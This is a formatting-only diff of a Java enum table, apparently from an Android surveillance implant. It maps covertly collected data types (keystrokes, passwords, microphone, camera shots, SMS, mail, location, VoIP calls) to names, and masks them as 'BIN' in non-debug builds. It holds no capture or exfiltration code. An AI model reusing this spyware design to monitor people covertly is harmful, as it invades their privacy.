@@ -140,83 +140,73 @@ public class EvidenceType {
 			// $ cat src/com/android/service/evidence/EvidenceType.java | grep
 			// final| awk '{ print $5; }' | cut -d= -f1 | awk '{ print
 			// "values.put(" $1 ",\"" $1 "\");"; }'
-			values.put(UNKNOWN, "UNKNOWN");
-			values.put(NONE, "NONE");
-			values.put(FILEOPEN, "FILEOPEN");
-			values.put(FILECAPTURE, "FILECAPTURE");
-			values.put(KEYLOG, "KEYLOG");
-			values.put(PRINT, "PRINT");
-			values.put(SNAPSHOT, "SNAPSHOT");
-			values.put(UPLOAD, "UPLOAD");
-			values.put(DOWNLOAD, "DOWNLOAD");
-			values.put(CALL, "CALL");
-			values.put(CALL_SKYPE, "CALL_SKYPE");
-			values.put(CALL_GTALK, "CALL_GTALK");
-			values.put(CALL_YMSG, "CALL_YMSG");
-			values.put(CALL_MSN, "CALL_MSN");
-			values.put(CALL_MOBILE, "CALL_MOBILE");
-			values.put(URL, "URL");
-			values.put(CLIPBOARD, "CLIPBOARD");
-			values.put(PASSWORD, "PASSWORD");
-			values.put(MIC, "MIC");
-			values.put(CHAT, "CHAT");
-			values.put(CAMSHOT, "CAMSHOT");
-			values.put(ADDRESSBOOK, "ADDRESSBOOK");
-			values.put(CALENDAR, "CALENDAR");
-			values.put(TASK, "TASK");
-			values.put(MAIL, "MAIL");
-			values.put(SMS, "SMS");
-			values.put(MMS, "MMS");
-			values.put(LOCATION, "LOCATION");
-			values.put(CALLLIST, "CALLLIST");
-			values.put(DEVICE, "DEVICE");
-			values.put(INFO, "INFO");
-			values.put(APPLICATION, "APPLICATION");
-			values.put(SKYPEIM, "SKYPEIM");
-			values.put(MAIL_RAW, "MAIL_RAW");
-			values.put(SMS_NEW, "SMS_NEW");
-			values.put(LOCATION_NEW, "LOCATION_NEW");
-			values.put(FILESYSTEM, "FILESYSTEM");
+			values.put(UNKNOWN, "UNKNOWN"); //$NON-NLS-1$
+			values.put(NONE, "NONE"); //$NON-NLS-1$
+			values.put(FILEOPEN, "FILEOPEN"); //$NON-NLS-1$
+			values.put(FILECAPTURE, "FILECAPTURE"); //$NON-NLS-1$
+			values.put(KEYLOG, "KEYLOG"); //$NON-NLS-1$
+			values.put(PRINT, "PRINT"); //$NON-NLS-1$
+			values.put(SNAPSHOT, "SNAPSHOT"); //$NON-NLS-1$
+			values.put(UPLOAD, "UPLOAD"); //$NON-NLS-1$
+			values.put(DOWNLOAD, "DOWNLOAD"); //$NON-NLS-1$
+			values.put(CALL, "CALL"); //$NON-NLS-1$
+			values.put(CALL_SKYPE, "CALL_SKYPE"); //$NON-NLS-1$
+			values.put(CALL_GTALK, "CALL_GTALK"); //$NON-NLS-1$
+			values.put(CALL_YMSG, "CALL_YMSG"); //$NON-NLS-1$
+			values.put(CALL_MSN, "CALL_MSN"); //$NON-NLS-1$
+			values.put(CALL_MOBILE, "CALL_MOBILE"); //$NON-NLS-1$
+			values.put(URL, "URL"); //$NON-NLS-1$
+			values.put(CLIPBOARD, "CLIPBOARD"); //$NON-NLS-1$
+			values.put(PASSWORD, "PASSWORD"); //$NON-NLS-1$
+			values.put(MIC, "MIC"); //$NON-NLS-1$
+			values.put(CHAT, "CHAT"); //$NON-NLS-1$
+			values.put(CAMSHOT, "CAMSHOT"); //$NON-NLS-1$
+			values.put(ADDRESSBOOK, "ADDRESSBOOK"); //$NON-NLS-1$
+			values.put(CALENDAR, "CALENDAR"); //$NON-NLS-1$
+			values.put(TASK, "TASK"); //$NON-NLS-1$
+			values.put(MAIL, "MAIL"); //$NON-NLS-1$
+			values.put(SMS, "SMS"); //$NON-NLS-1$
+			values.put(MMS, "MMS"); //$NON-NLS-1$
+			values.put(LOCATION, "LOCATION"); //$NON-NLS-1$
+			values.put(CALLLIST, "CALLLIST"); //$NON-NLS-1$
+			values.put(DEVICE, "DEVICE"); //$NON-NLS-1$
+			values.put(INFO, "INFO"); //$NON-NLS-1$
+			values.put(APPLICATION, "APPLICATION"); //$NON-NLS-1$
+			values.put(SKYPEIM, "SKYPEIM"); //$NON-NLS-1$
+			values.put(MAIL_RAW, "MAIL_RAW"); //$NON-NLS-1$
+			values.put(SMS_NEW, "SMS_NEW"); //$NON-NLS-1$
+			values.put(LOCATION_NEW, "LOCATION_NEW"); //$NON-NLS-1$
+			values.put(FILESYSTEM, "FILESYSTEM"); //$NON-NLS-1$
 		}
 
 		return values.get(value);
 	}
-	
+
 	/** The Constant TYPE_EVIDENCE. */
-	private static final int[] TYPE_EVIDENCE = new int[] {
-			EvidenceType.INFO,
-			EvidenceType.MAIL_RAW,
-			EvidenceType.ADDRESSBOOK,
-			EvidenceType.CALLLIST, // 0..3
-			EvidenceType.DEVICE,
-			EvidenceType.LOCATION,
-			EvidenceType.CALL,
-			EvidenceType.CALL_MOBILE, // 4..7
-			EvidenceType.KEYLOG, EvidenceType.SNAPSHOT,
-			EvidenceType.URL,
-			EvidenceType.CHAT, // 8..b
-			EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT,
-			EvidenceType.CLIPBOARD, // c..f
+	private static final int[] TYPE_EVIDENCE = new int[] { EvidenceType.INFO, EvidenceType.MAIL_RAW,
+			EvidenceType.ADDRESSBOOK, EvidenceType.CALLLIST, // 0..3
+			EvidenceType.DEVICE, EvidenceType.LOCATION, EvidenceType.CALL, EvidenceType.CALL_MOBILE, // 4..7
+			EvidenceType.KEYLOG, EvidenceType.SNAPSHOT, EvidenceType.URL, EvidenceType.CHAT, // 8..b
+			EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT, EvidenceType.CLIPBOARD, // c..f
 			EvidenceType.NONE, EvidenceType.APPLICATION, // 10..11
 			EvidenceType.NONE // 12
 	};
 
 	/** The Constant MEMO_TYPE_EVIDENCE. */
-	public static final String[] MEMO_TYPE_EVIDENCE = new String[] { "INF",
-			"MAR", "ADD", "CLL", // 0..3
-			"DEV", "LOC", "CAL", "CLM", // 4..7
-			"KEY", "SNP", "URL", "CHA", // 8..b
-			"MAI", "MIC", "CAM", "CLI", // c..f
-			"NON", "APP", // 10..11
-			"NON" // 12
+	public static final String[] MEMO_TYPE_EVIDENCE = new String[] { "INF", "MAR", "ADD", "CLL", // 0..3 //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+			"DEV", "LOC", "CAL", "CLM", // 4..7 //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+			"KEY", "SNP", "URL", "CHA", // 8..b //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+			"MAI", "MIC", "CAM", "CLI", // c..f //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+			"NON", "APP", // 10..11 //$NON-NLS-1$ //$NON-NLS-2$
+			"NON" // 12 //$NON-NLS-1$
 
 	};
 
 	public static String getMemo(int evidenceType) {
-		if(Cfg.DEBUG){
+		if (Cfg.DEBUG) {
 			return getValue(evidenceType).substring(0, 3);
-		}else{
-			return "BIN";
+		} else {
+			return "BIN"; //$NON-NLS-1$
 		}
 	}
 }
